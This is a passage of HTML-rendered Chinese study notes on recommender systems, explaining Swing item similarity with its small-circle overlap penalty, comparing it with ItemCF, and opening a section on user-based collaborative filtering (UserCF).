encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathcal{J}\_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span></span></span></span>，喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\mathcal{J}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>，定义两个用户的重合度：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">overlap</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\operatorname{overlap}\left(u_{1}, u_{2}\right)=\left|\mathcal{J}\_{1} \cap \mathcal{J}\_{2}\right|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">o</span><span class="mord mathrm" style="margin-right:0.01389em;">v</span><span class="mord mathrm">e</span><span class="mord mathrm">r</span><span class="mord mathrm">l</span><span class="mord mathrm">a</span><span class="mord mathrm">p</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.21799em;vertical-align:-0.35000999999999993em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的重合度⾼，则他们可能来⾃⼀个⼩圈⼦，要降低他们的权重。</p><p>喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathcal{W}\_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span></span></span></span>，喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\mathcal{W}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>，定义交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">V</mi><mo>=</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\mathcal{V}=\mathcal{W}\_{1} \cap \mathcal{W}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">V</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>，则两个物品的相似度：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><munder><mo>∑</mo><mrow><msub><mi>u</mi><mn>1</mn></msub><mo>∈</mo><mi mathvariant="script">V</mi></mrow></munder><munder><mo>∑</mo><mrow><msub><mi>u</mi><mn>2</mn></msub><mo>∈</mo><mi mathvariant="script">V</mi></mrow></munder><mfrac><mn>1</mn><mrow><mi>α</mi><mo>+</mo><mi mathvariant="normal">overlap</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(i_{1}, i_{2}\right)=\sum_{u_{1} \in \mathcal{V}} \sum_{u_{2} \in \mathcal{V}} \frac{1}{\alpha+\operatorname{overlap}\left(u_{1}, u_{2}\right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.7158759999999997em;vertical-align:-1.394436em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.08222em;">V</span></span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.394436em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.08222em;">V</span></span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.394436em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mop"><span class="mord mathrm">o</span><span class="mord mathrm" style="margin-right:0.01389em;">v</span><span class="mord mathrm">e</span><span class="mord mathrm">r</span><span class="mord mathrm">l</span><span class="mord mathrm">a</span><span class="mord mathrm">p</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h2 id="2-2-总结">2.2 总结</h2><p><code>Swing</code> 与 <code>ItemCF</code> 唯⼀的区别在于<strong>物品相似度</strong>。</p><ul><li>**ItemCF：**两个物品重合的用户⽐例⾼，则判定两个物品相似。</li><li>**Swing：**额外考虑重合的用户是否来⾃⼀个⼩圈⼦。</li></ul><p>同时喜欢两个物品的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">V</mi></mrow><annotation encoding="application/x-tex">\mathcal{V}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">V</span></span></span></span></span>，对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">V</mi></mrow><annotation encoding="application/x-tex">\mathcal{V}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">V</span></span></span></span></span> 中的用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，重合度记作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">overlap</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\operatorname{overlap}\left(u_{1}, u_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">o</span><span class="mord mathrm" style="margin-right:0.01389em;">v</span><span class="mord mathrm">e</span><span class="mord mathrm">r</span><span class="mord mathrm">l</span><span class="mord mathrm">a</span><span class="mord mathrm">p</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>。两个用户重合度大，则可能来自一个小圈子，权重降低。</p><hr><h1>3 基于用户的协同过滤 UserCF</h1><p><img src="image_ZljfSvUGwd.png" alt=""></p><p>推荐系统如何找到跟我兴趣非常相似的网友呢？</p><ol><li>⽅法⼀：点击、点赞、收藏、转发的笔记有很⼤的重合。</li><li>⽅法⼆：关注的作者有很⼤的重合。</li></ol><h2 id="3-1-usercf-的实现">3.1 UserCF 的实现</h2><p><img src="image_qV5IKglIkG.png" alt=""></p><p>预估用户对候选物品的兴趣：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∑</mo><mi>j</mi></munder><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><msub><mo><mi mathvariant="normal">user</mi><mo>⁡</mo></mo><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>×</mo><mi mathvariant="normal">like</mi><mo>⁡</mo><mo fence="true">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>j</mi></msub><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{j} \operatorname{sim}\left(u s e r, \operatorname{user}_{j}\right) \times \operatorname{like}\left(\right. user _{j}, item )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.463782em;vertical-align:-1.413777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">u</span><span class="mord mathrm">s</span><span class="mord mathrm">e</span><span class="mord mathrm">r</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span 